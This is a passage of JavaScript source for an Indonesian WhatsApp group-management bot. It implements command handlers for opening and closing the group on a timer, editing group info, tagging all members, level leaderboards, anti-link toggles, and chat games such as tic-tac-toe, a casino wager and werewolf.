m.reply(`Sukses membuka grup`)
}
break

case 'close': 
case 'tutup': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
Line.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Sukses menutup grup`)
}
break

case 'opentime': {
if (!isAdmins) return onlyAdmin();
if (!isBotAdmins) return onlyBotAdmin();
const timeUnits = {
detik: 1000,
menit: 60000,
jam: 3600000,
hari: 86400000
};
const unit = args[1]?.toLowerCase();
const multiplier = timeUnits[unit];
const duration = parseInt(args[0]);
if (!multiplier || isNaN(duration) || duration <= 0) {
return m.reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${prefix+command} 10 detik`);
}
const timer = duration * multiplier;
m.reply(`Open time ${duration} ${unit} dimulai dari sekarang!`);
const sendReminder = (message, delay) => {
if (timer > delay) {
setTimeout(() => {
m.reply(message);
}, timer - delay);
}};
sendReminder(`Pengingat: 10 detik lagi grup akan dibuka!`, 10000);
setTimeout(() => {
const open = `*[ OPEN TIME ]* Grup telah dibuka!`;
Line.groupSettingUpdate(from, 'not_announcement');
m.reply(open);
}, timer);
}
break

case 'closetime': {
if (!isAdmins) return onlyAdmin();
if (!isBotAdmins) return onlyBotAdmin();
const timeUnits = {
detik: 1000,
menit: 60000,
jam: 3600000,
hari: 86400000
};
const unit = args[1]?.toLowerCase();
const multiplier = timeUnits[unit];
const duration = parseInt(args[0]);
if (!multiplier || isNaN(duration) || duration <= 0) {
return m.reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${prefix+command} 10 detik`);
}
const timer = duration * multiplier;
m.reply(`Close time ${duration} ${unit} dimulai dari sekarang!`);
const sendReminder = (message, delay) => {
if (timer > delay) {
setTimeout(() => {
m.reply(message);
}, timer - delay);
}};
sendReminder(`Pengingat: 10 detik lagi grup akan ditutup!`, 10000);
setTimeout(() => {
const close = `*[ CLOSE TIME ]* Grup telah ditutup!`;
Line.groupSettingUpdate(from, 'announcement');
m.reply(close);
}, timer);
}
break

case 'setsubjek':
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args.length < 1) return m.reply(`Contoh: ${prefix+command} teks`)
await Line.groupUpdateSubject(from, text)
m.reply(`Sukses mengganti nama grup`)
break

case 'setdesk': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (!text) return m.reply(`Contoh: ${prefix+command} teks`)
await Line.groupUpdateDescription(from, text)
m.reply(`Sukses mengganti deskripsi grup`)
}
break

case 'setppgc': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
let media = await Line.downloadAndSaveMediaMessage(quoted)
await Line.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply("Sukses mengganti profil grup")
}
break

case 'delppgc': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
await Line.removeProfilePicture(from)
await m.reply(`Sukses menghapus profil grup`)
}
break

case 'getnamagc': {
if (!m.isGroup) return onlyGrup()
if (!isBotAdmins) return onlyBotAdmin()
vreply(`${groupMetadata.subject}`)
}
break

case 'getdeskgc': {
if (!m.isGroup) return onlyGrup()
if (!isBotAdmins) return onlyBotAdmin()
vreply(`${groupMetadata.desc}`)
}
break

case 'getppgc': {
  if (!m.isGroup) return onlyGrup()
  try {
    avatar = await Line.profilePictureUrl(m.chat, "image")
  } catch {
    avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
  }
  Line.sendMessage(m.chat, {
    image: {
      url: avatar
    },
    caption: `© ${wm}`
  }, {
    quoted: m
  })
}
break

case 'getname': {
  if (!m.isGroup) return onlyGrup()
  if (m.quoted) {
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    let nama = Line.getName(users)
    m.reply(nama)
  } else m.reply('Kutip pesan seseorang!')
}
break

case 'getpp': {
if (!m.isGroup) return onlyGrup();
let phoneNumber = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';  
if (phoneNumber) {
try {
let avatar = await Line.profilePictureUrl(phoneNumber, "image");
Line.sendMessage(m.chat, {
image: { url: avatar },
caption: `© ${wm}`
}, {
quoted: m
});
} catch {
let defaultAvatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';
Line.sendMessage(m.chat, {
image: { url: defaultAvatar },
caption: 'Terjadi Kesalahan'
}, {
quoted: m
});
}
} else {
m.reply('Contoh penggunaan: .getpp 628568782064');
}
}
break

case 'infogrup':
case 'infogc': {
  if (!m.isGroup) return onlyGrup();
  let admin = groupMetadata.participants.filter(p => p.admin);
  let creationDate = moment(groupMetadata.creation * 1000).format('DD/MM/YY HH:mm');
  let subject = groupMetadata.subject;
  let restrict = groupMetadata.restrict ? 'Hanya admin' : 'Semua peserta';
  let announce = groupMetadata.announce ? 'Hanya admin' : 'Semua peserta';
  let antiLink = db.data.chats[m.chat].antilink ? 'Aktif' : 'Nonaktif';
  let antiLinkgc = db.data.chats[m.chat].antilinkgc ? 'Aktif' : 'Nonaktif';
  let teks = `${monospace("INFO GROUP")}

Nama grup: ${subject}
Total admin: ${admin.length}
Total member: ${groupMetadata.participants.length}
Tgl dibuat: ${creationDate}

Mengedit info grup:
- ${restrict}
Mengirim pesan:
- ${announce}

Anti-link: ${antiLink}
Anti-linkgc: ${antiLinkgc}

Grup ID: ${groupMetadata.id}`;
  vreply(teks)
}
break

case 'topglobal': {
if (!m.isGroup) return onlyGrup();
let ownerIds = JSON.parse(fs.readFileSync('./data/owner.json'), 'utf-8')
ownerIds = ownerIds.map(id => id + '@s.whatsapp.net');
let levelOwners = []
let levelUsers = Object.keys(global.db.data.users)
.filter(id => !ownerIds.includes(id))
.map(id => ({ id, level: global.db.data.users[id].level }));
for (let ownerId of ownerIds) {
if (global.db.data.users[ownerId]) {
levelOwners.push({ id: ownerId, level: global.db.data.users[ownerId].level });
}}
levelUsers.sort((a, b) => b.level - a.level);
let top = '*── 「 TOP GLOBAL - LEVEL 」 ──*\n\n';
let ownerCount = 1;
for (let i = 0; i < levelOwners.length; i++) {
let owner = levelOwners[i];
let levv = db.data.users[owner.id].level
let { rank, rankid } = await ranke(owner.id)
top += `${ownerCount}. OWNER\n  • Rank: ${rank} ${rankid}\n  • Level: ${levv}\n  • Exp: ${db.data.users[owner.id].exp}\n\n`;
ownerCount++;
}
let arrTop = [];
let total = 10;
if (levelUsers.length < 10) total = levelUsers.length;
for (let i = 0; i < total; i++) {
let lev = db.data.users[levelUsers[i].id].level
top += `*──────────────*\n\n${i + 1}. ${levelUsers[i].id.split("@")[0]}\n  • Level: ${lev}\n  • Exp: ${db.data.users[levelUsers[i].id].exp}\n\n`;
arrTop.push(levelUsers[i].id)}
mentions(top, arrTop, true);
}
break

case 'toplocal': {
if (!m.isGroup) return onlyGrup();
let anggroup = groupMembers.map(a => a.id);
let ownerIds = JSON.parse(fs.readFileSync('./data/owner.json'), 'utf-8')
ownerIds = ownerIds.map(id => id + '@s.whatsapp.net');
let levelUsers = Object.keys(global.db.data.users)
.filter(id => !ownerIds.includes(id))
.map(id => ({ id, level: global.db.data.users[id].level }));
levelUsers.sort((a, b) => b.level - a.level);
let levelGrupUsers = levelUsers.filter(user => anggroup.includes(user.id));
let levelOwners = []
for (let ownerId of ownerIds) {
if (global.db.data.users[ownerId]) {
levelOwners.push({ id: ownerId, level: global.db.data.users[ownerId].level });
}}
let combinedLevel = levelOwners.concat(levelGrupUsers);
combinedLevel.sort((a, b) => b.level - a.level);
let total = combinedLevel.length < 10 ? combinedLevel.length : 10;
let top = '*── 「 TOP LOCAL - LEVEL 」 ──*\n\n';
let arrTop = [];
for (let i = 0; i < total; i++) {
let user = combinedLevel[i];
let rolle = db.data.users[user.id].level
let { rank, rankid } = await ranke(user.id)
if (ownerIds.includes(user.id)) {
top += `${i + 1}. OWNER\n  • Rank: ${rank} ${rankid}\n  • Level: ${rolle}\n  • Exp: ${db.data.users[user.id].exp}\n\n`;
} else {
top += `${i + 1}. ${user.id.split("@")[0]}\n  • Level: ${rolle}\n  • Exp: ${db.data.users[user.id].exp}\n\n`;
}
arrTop.push(user.id)}
mentions(top, arrTop, true);
}
break

case 'leavegc': {
try {
if (!isOwner) return onlyOwn()
await Line.groupLeave(m.chat)
} catch (err) {
console.error(err)
m.reply('Terjadi kesalahan')
}}
break

case 'q':
case 'quoted': {
if (!m.quoted) return m.reply('Reply pesan seseorang!')
let quo = await Line.serializeM(await m.getQuotedObj())
if (!quo.quoted) return m.reply('Pesan yang kamu reply tidak dikirim oleh bot!')
await quo.quoted.copyNForward(m.chat, true)
}
break

case 'antilink': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args[0] === 'on') {
if (db.data.chats[m.chat].antilink) return m.reply(`Sudah aktif sebelumnya`)
db.data.chats[m.chat].antilink = true
m.reply('Sukses mengaktifkan antilink!')
} else if (args[0] === 'off') {
if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah nonaktifkan sebelumnya`)
db.data.chats[m.chat].antilink = false
m.reply('Sukses menonaktifkan antilink!')
} else {
m.reply(`Contoh: ${prefix+command} on/off`)
}}
break

case 'antilinkgc': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args[0] === 'on') {
if (db.data.chats[m.chat].antilinkgc) return m.reply(`Sudah aktif sebelumnya`)
db.data.chats[m.chat].antilinkgc = true
m.reply('Sukses mengaktifkan antilinkgc!')
} else if (args[0] === 'off') {
if (!db.data.chats[m.chat].antilinkgc) return m.reply(`Sudah nonaktifkan sebelumnya`)
db.data.chats[m.chat].antilinkgc = false
m.reply('Sukses menonaktifkan antilinkgc!')
} else {
m.reply(`Contoh: ${prefix+command} on/off`)
}}
break

case 'antibot': {
  if (!isOwner && !isAdmins) return onlyOa()
  if (!args[0]) return m.reply(`Contoh: ${p_c} on/off`)
  if (args[0] === 'on') {
    global.antibot = true
    await m.reply('Sukses mengaktifkan antibot.')
  } else if (args[0] === 'off') {
    global.antibot = false
    await m.reply('Sukses menonaktifkan antibot.')
  }
}
break

case 'antitoxic': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args[0] === 'on') {
if (db.data.chats[m.chat].antitoxic) return m.reply(`Sudah aktif sebelumnya`)
db.data.chats[m.chat].antitoxic = true
m.reply('Sukses mengaktifkan antitoxic!')
} else if (args[0] === 'off') {
if (!db.data.chats[m.chat].antitoxic) return m.reply(`Sudah nonaktifkan sebelumnya`)
db.data.chats[m.chat].antitoxic = false
m.reply('Sukses menonaktifkan antitoxic!')
} else {
m.reply(`Contoh: ${p_c} on/off`)
}
}
break

case 'modegrup':
case 'gconly': {
  if (!isOwner) return onlyOwn()
  if (!args[0]) return m.reply(`Contoh: ${p_c} on/off`)
  if (args[0] === 'on') {
    global.gconly = true
    global.pconly = false
    await m.reply('Sukses mengubah ke mode gc-only.')
  } else if (args[0] === 'off') {
    global.gconly = false
    await m.reply('Sukses mengubah ke mode gc/pc only.')
  }
}
break

case 'modepv':
case 'pconly': {
  if (!isOwner) return onlyOwn()
  if (!args[0]) return m.reply(`Contoh: ${p_c} on/off`)
  if (args[0] === 'on') {
    global.pconly = true
    global.gconly = false
    await m.reply('Sukses mengubah ke mode pc-only.')
  } else if (args[0] === 'off') {
    global.pconly = false
    await m.reply('Sukses mengubah ke mode gc/pc only.')
  }
}
break

case 'h':
case 'hidetag': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyOa()
if (m.quoted) {
Line.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
if (!m.quoted) {
Line.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: ftext })
}}
break

case 'tagall': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyOa()
if (!isBotAdmins) return onlyBotAdmin()
let teks = `*👥 Tag All By Admin*
 
Pesan: ${q ? q : 'Tidak ada'}\n\n`
for (let mem of participants) {
teks += `• @${mem.id.split('@')[0]}\n`
}
Line.sendMessage(m.chat, {
text: teks,
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
break

case 'totag': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyOa()
if (!isBotAdmins) return onlyBotAdmin()
if (!m.quoted) return m.reply(`Kutip pesan dengan caption ${prefix+command}`)
Line.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break

case 'del2':
case 'delete2': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyOa()
if (!isBotAdmins) return onlyBotAdmin()
if (!m.quoted) return m.reply('Kutip pesan yang ingin dihapus!')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break

case 'banchat':
case 'mute': {
if (!isOwner) return onlyOwn()
if (!m.isGroup) return onlyGrup()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
db.data.chats[m.chat].mute = true
await m.reply('Sukses mute untuk grup ini.')
} else if (args[0] === 'off') {
db.data.chats[m.chat].mute = false
await m.reply('Sukses mute untuk grup ini.')
}}
break

case 'afk': {
if (!m.isGroup) return onlyGrup()
if (m.key.fromMe) return m.reply('Bot tidak dapat AFK')
if (isAfkOn) return m.reply('AFK sudah diaktifkan sebelumnya')
let reason = text ? text : 'Tidak ada.'
afk.addAfkUser(m.sender, Date.now(), reason, _afk)
Line.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang AFK\nAlasan: ${reason}`, m)
}
break

case 'welcome': {
  if (!m.isGroup) return onlyGrup()
  if (!isAdmins && !isOwner) return onlyOa()
  if (!args[0]) return m.reply(`Contoh: ${p_c} on/off`)
  if (args[0] === 'on') {
    global.welcome = true
    await m.reply('Sukses mengaktifkan autowelcome.')
  } else if (args[0] === 'off') {
    global.welcome = false
    await m.reply('Sukses menonaktifkan autowelcome.')
  }
}
break

case 'setwelcome': {
  if (!m.isGroup) return onlyGrup()
  if (!isAdmins && !isOwner) return onlyOa()
  if (args.length < 1) return m.reply(`Contoh: ${p_c} <teks>\n\nFormat:\n@user - Tag user baru\n@group - Nama grup`);

  global.tekswelcome = text
  m.reply("Teks welcome berhasil diubah!\n\nTeks baru:\n" + tekswelcome);
}
break

case 'setgoodbye': {
  if (!m.isGroup) return onlyGrup()
  if (!isAdmins && !isOwner) return onlyOa()
  if (args.length < 1) return m.reply(`Contoh: ${p_c} <teks>\n\nFormat:\n@user - Tag user baru\n@group - Nama grup`);

  global.teksgoodbye = text
  m.reply('Teks goodbye berhasil diubah!\n\nTeks baru:\n' + teksgoodbye);
}
break

// === Games Menu

case 'utangga': {
let { message, idGame } = mulaiGame(m.sender)
let yao = `{\"display_text\":\"Gabung\",\"id\":\"${prefix}join2 ${idGame}\"}`
quickreply1(m.chat, message, yao, m)
break
}

case 'join2': {
let idGame = args[0]
let hasil = joinGame(idGame, m.sender)
m.reply(hasil)
break
}

case 'lempar': {
let hasil = mainGameAuto(m.sender)
m.reply(hasil)
break
}

case 'delutg': {
let hasil = hapusGameAuto(m.sender)
m.reply(hasil)
break
}

case 'family100': 
case 'f100': {
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/family100.json')));
console.log('Jawaban: '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await m.reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
let jwb = family100[from].jawaban
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab:\n`
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}}
break

case 'suit':
case 'suitpvp': {
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) return m.reply(`Selesaikan suit mu yang sebelumnya!`)
gue = `0@s.whatsapp.net`
if (!froms) return m.reply(`Siapa yang ingin kamu tantang?\n\nContoh: ${prefix+command} @${gue.split('@')[0]}`)
if (froms === botNumber) return m.reply(`Tidak bisa bermain dengan bot!`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return m.reply(`Orang nya lagi main sama yang lain!`)
var hadiah = randomNomor(10, 20)
let poin = 10
let poin_lose = 10
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await Line.sendTeks(from, `@${m.sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit\n\nKirim *gas/gak* untuk bermain`, m),
id: id,
p: m.sender,
p2: froms,
status: 'Wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) Line.sendMessage(from, {text: `Waktu suit habis!` }, {quoted: m})
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'ttt':
case 'ttc':
case 'tictactoe': {
if (!m.isGroup) return onlyGrup()
let TicTacToe = require("./lib/game/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply( 'Kamu masih didalam game!')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Lawan bermain ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik .nyerah untuk menyerah`
if (room.x !== room.o) await Line.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Line.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu lawan bermain' + (text ? ` mengetik command dibawah ini ${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break

case 'delttt': 
case 'delttc':
case 'deltictactoe': {
let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return m.reply( `Kamu sedang tidak bermain tictactoe!`)
delete this.game[roomnya.id]
m.reply(`Game tictactoe telah diakhiri!`)
}
break

case 'tebakbom': 
case 'petakbom': {
if (petakbom[m.sender]) return m.reply(`Sesi game mu belum terselesaikan, lanjutkan:\n\n${petakbom[sender].board.join("")}\n\nKetik ${prefix}delpetakbom untuk menghapus sesi game`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[m.sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"],
bomb: 3,
lolos: 6,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await m.reply(`*PETAK BOM*

${petakbom[m.sender].board.slice(0, 3).join("")}
${petakbom[m.sender].board.slice(3, 6).join("")}
${petakbom[m.sender].board.slice(6).join("")}

Pillih angka diatas tetapi berhati-hati
lah, karena ada bom!

Bomb: ${petakbom[m.sender].bomb}
Nyawa: ${petakbom[m.sender].nyawa.join("")}`);
}
break

case 'delpetakbom': {
if (!(m.sender in petakbom)) return m.reply(`Kamu sedang tidak bermain petakbom!`)
delete petakbom[m.sender];
m.reply(`Game petakbom telah diakhiri!`)
}
break

case 'casino': {
if (!m.isGroup) return onlyGrup()
if (!text) return m.reply(`Contoh: ${prefix+command} @tag nominal`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/kutip pesan seseorang!`)
if (fs.existsSync(`./data/${m.chat}.json`)) return m.reply(`Masih ada sesi sebelumnya\nKetik ${prefix}delcasino untuk menghapus sesi`)
if (!args[1]) return m.reply('Masukkan nominal nya!')
if (args[1].includes('-')) return m.reply(`Jangan menggunakan -`)
if (isNaN(parseInt(args[1]))) return m.reply('Nominal harus herupa angka!')
var anu = cekSaldo(m.sender)
var ani = cekSaldo(m.mentionedJid[0])
if (anu < args[1] || anu == 'undefined') return m.reply(`Saldo tidak mencukupi, kumpulkan terlebih dahulu\nKetik ${prefix}saldo untuk mengecek saldo mu`)
if (ani < args[1] || ani == 'undefined') return m.reply(`Saldo lawan tidak mencukupi untuk bermain dengan mu`)
var casinoo = setCasino(`${m.chat}`)
casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
casinoo.Y = users
casinoo.nominal = parseInt(args[1])
fs.writeFileSync(`./data/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
var starGame = `*🎰 GAME CASINO 💰*\n\n• @${m.sender.replace("@s.whatsapp.net", "")}\nMenantang 乂\n• ${args[0]}\n\nDengan nominal: Rp ${parseInt(args[1])}\nSilahkan tunggu ${args[0]} memilih`
buton = `{\"display_text\":\"TERIMA\",\"id\":\"Y\"}`
butoff = `{\"display_text\":\"TOLAK\",\"id\":\"N\"}`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: starGame
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": buton
},
{
"name": "quick_reply",
"buttonParamsJson": butoff
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await Line.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
}
break

case 'delcasino': {
if (fs.existsSync('./data/'+m.chat+'.json')) {
var csn = JSON.parse(fs.readFileSync('./data/'+m.chat+'.json'))
if (csn.Z.includes(m.sender)) {
deleteCasino(m.chat)
m.reply('Game casino telah diakhiri!')
} else if (csn.Y.includes(m.sender)) {
deleteCasino(m.chat)
m.reply('Game casino telah diakhiri!')
} else if (isOwner) {
deleteCasino(m.chat)
m.reply('Game casino telah diakhiri!')
} else {
m.reply('Hanya untuk pemain!')
}
} else {
m.reply('Kamu sedang tidak bermain casino!')}
}
break

case 'wwpc':
case 'ww':
case 'werewolf': {
	let {
		emoji_role,
		sesi,
		playerOnGame,
		playerOnRoom,
		playerExit,
		dataPlayer,
		dataPlayerById,
		getPlayerById,
		getPlayerById2,
		killWerewolf,
		killww,
		dreamySeer,
		sorcerer,
		protectGuardian,
		roleShuffle,
		roleChanger,
		roleAmount,
		roleGenerator,
		addTimer,
		startGame,
		playerHidup,
		playerMati,
		vote,
		voteResult,
		clearAllVote,
		getWinner,
		win,
		pagi,
		malam,
		skill,
		voteStart,
		voteDone,
		voting,
		run,
		run_vote,
		run_malam,
		runprefixagi
	} = require('./lib/game/werewolf')
	let thumb = "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";
	const {
		sender,
		chat
	} = m;
	Line.werewolf = Line.werewolf ? Line.werewolf : {};
	const ww = Line.werewolf ? Line.werewolf : {};
	const data = ww[chat];
	const value = args[0];
	const target = args[1];
	let byId = getPlayerById2(sender, parseInt(target), ww);
	if (value === "create") {
		if (!m.isGroup) return onlyGrup()
		if (chat in ww) return m.reply("Group masih dalam sesi permainan");
		if (playerOnGame(sender, ww) === true) return m.reply("Kamu masih dalam sesi game");
		ww[chat] = {
			room: chat,
			owner: sender,
			status: false,
			iswin: null,
			cooldown: null,
			day: 0,
			time: "malem",
			player: [],
			dead: [],
			voting: false,
			seer: false,
			guardian: [],
		};
		await m.reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");
	} else if (value === "join") {
		if (!m.isGroup) return onlyGrup()
		if (!ww[chat]) return m.reply("Belum ada sesi permainan");
		if (ww[chat].status === true) return m.reply("Sesi permainan sudah dimulai");
		if (ww[chat].player.length > 16) return m.reply("Maaf jumlah player telah penuh");
		if (playerOnRoom(sender, chat, ww) === true) return m.reply("Kamu sudah join dalam room ini");
		if (playerOnGame(sender, ww) === true) return m.reply("Kamu masih dalam sesi game");
		let data = {
			id: sender,
			number: ww[chat].player.length + 1,
			sesi: chat,
			status: false,
			role: false,
			effect: [],
			vote: 0,
			isdead: false,
			isvote: false,
		};
		ww[chat].player.push(data);
		let player = [];
		let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
		for (let i = 0; i < ww[chat].player.length; i++) {
			text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
			player.push(ww[chat].player[i].id);
		}
		text += "\nJumlah player minimal adalah 5 dan maximal 15";
		Line.sendMessage(m.chat, {
			text: text.trim(),
			contextInfo: {
				externalAdReply: {
					title: "W E R E W O L F",
					mediaType: 1,
					renderLargerThumbnail: true,
					thumbnail: await resize(thumb, 300, 175),
					sourceUrl: "https://whatsapp.com/channel/0029Vaf0HPMLdQeZsp3XRp2T",
					mediaUrl: thumb,
				},
				mentionedJid: player,
			},
		}, {
			quoted: m
		});
	} else if (value === "start") {
		if (!m.isGroup) return onlyGrup()
		if (!ww[chat]) return m.reply("Belum ada sesi permainan");
		if (ww[chat].player.length === 0) return m.reply("Room belum memiliki player");
		if (ww[chat].player.length < 5) return m.reply("Maaf jumlah player belum memenuhi syarat");
		if (playerOnRoom(sender, chat, ww) === false) return m.reply("Kamu belum join dalam room ini");
		if (ww[chat].cooldown > 0) {
			if (ww[chat].time === "voting") {
				clearAllVote(chat, ww);
				addTimer(chat, ww);
				return await run_vote(vioo, chat, ww);
			} else if (ww[chat].time === "malem") {
				clearAllVote(chat, ww);
				addTimer(chat, ww);
				return await run_malam(vioo, chat, ww);
			} else if (ww[chat].time === "pagi") {
				clearAllVote(chat, ww);
				addTimer(chat, ww);
				return await runprefixagi(vioo, chat, ww);
			}
		}
		if (ww[chat].status === true) return m.reply("Sesi permainan telah dimulai");
		if (ww[chat].owner !== sender) return m.reply(`Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`);
		let list1 = "";
		let list2 = "";
		let player = [];
		roleGenerator(chat, ww);
		addTimer(chat, ww);
		startGame(chat, ww);
		for (let i = 0; i < ww[chat].player.length; i++) {
			list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
			player.push(ww[chat].player[i].id);
		}
		for (let i = 0; i < ww[chat].player.length; i++) {
			list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].role === "werewolf" || ww[chat].player[i].role === "sorcerer" ? `[${ww[chat].player[i].role}]` : ""}\n`;
			player.push(ww[chat].player[i].id);
		}
		for (let i = 0; i < ww[chat].player.length; i++) {
			if (ww[chat].player[i].role === "werewolf") {
				if (ww[chat].player[i].isdead != true) {
					var textt = `Hai ${Line.getName(ww[chat].player[i].id)}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role("werewolf")} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
					await Line.sendMessage(ww[chat].player[i].id, {
						text: textt,
						mentions: player,
					});
				}
			} else if (ww[chat].player[i].role === "warga") {
				if (ww[chat].player[i].isdead != true) {
					let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${Line.getName(ww[chat].player[i].id)} Peran kamu adalah *Warga Desa* ${emoji_role("warga")}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
					await Line.sendMessage(ww[chat].player[i].id, {
						text: texttt,
						mentions: player,
					});
